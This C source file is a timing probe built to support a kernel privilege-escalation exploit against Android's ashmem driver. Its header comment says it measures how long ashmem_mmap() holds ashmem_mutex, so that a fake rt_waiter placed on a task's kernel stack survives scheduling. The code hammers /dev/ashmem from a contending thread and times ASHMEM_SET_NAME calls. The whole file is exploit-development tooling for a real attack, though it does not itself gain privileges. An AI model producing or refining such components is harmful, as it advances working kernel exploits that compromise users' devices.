/*
 * gl_mutex_probe.c - how long does ashmem_mmap() hold ashmem_mutex?
 *
 * The exploit's fake rt_waiter lives on task A's kernel stack at
 * set_name()+92.  set_name() copies the 256-byte name first and *then* takes
 * ashmem_mutex, so if another thread holds that mutex A parks inside set_name
 * with sp below the buffer - the fake waiter then cannot be overwritten by a
 * schedule() frame.  This probe measures the only user-triggerable hold:
 * ashmem_mmap() -> shmem_file_setup().
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define ASHMEM_SET_NAME 0x41007701u
#define ASHMEM_SET_SIZE 0x40047703u

static volatile int stop;

static double now_us(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec * 1e6 + (double)ts.tv_nsec / 1e3;
}

static void msleep(int ms)
{
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static void *holder(void *arg)
{
    size_t size = (size_t)(uintptr_t)arg;
    while (!stop) {
        int fd = open("/dev/ashmem", O_RDWR);
        if (fd < 0)
            break;
        ioctl(fd, ASHMEM_SET_SIZE, size);
        void *p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (p != MAP_FAILED)
            munmap(p, size);
        close(fd);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    size_t size = 4u << 20;
    int iters = 4000;
    unsigned char name[256];
    double *dur;
    int i, fd, hits = 0;
    double base;

    if (argc > 1)
        size = (size_t)strtoul(argv[1], NULL, 0);
    if (argc > 2)
        iters = atoi(argv[2]);
    if (size < 4096)
        size = 4096;

    memset(name, 0x41, sizeof(name));
    fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0) {
        printf("open errno=%d\n", errno);
        return 1;
    }

    base = now_us();
    for (i = 0; i < 100; i++)
        ioctl(fd, ASHMEM_SET_NAME, name);
    base = (now_us() - base) / 100.0;
    printf("set_name baseline: %.1f us\n", base);

    dur = calloc((size_t)iters, sizeof(double));
    if (!dur)
        return 1;

    pthread_t th;
    pthread_create(&th, NULL, holder, (void *)(uintptr_t)size);
    msleep(50);

    for (i = 0; i < iters; i++) {
        double t0 = now_us();
        ioctl(fd, ASHMEM_SET_NAME, name);
        dur[i] = now_us() - t0;
    }
    stop = 1;
    pthread_join(th, NULL);

    double min = dur[0], max = dur[0], sum = 0;
    for (i = 0; i < iters; i++) {
        if (dur[i] < min) min = dur[i];
        if (dur[i] > max) max = dur[i];
        sum += dur[i];
        if (dur[i] > 20.0)
            hits++;
    }
    printf("holder size=%zu: set_name min=%.1f avg=%.1f max=%.1f us, "
           ">20us: %d/%d\n", size, min, sum / iters, max, hits, iters);
    free(dur);
    close(fd);
    return 0;
}
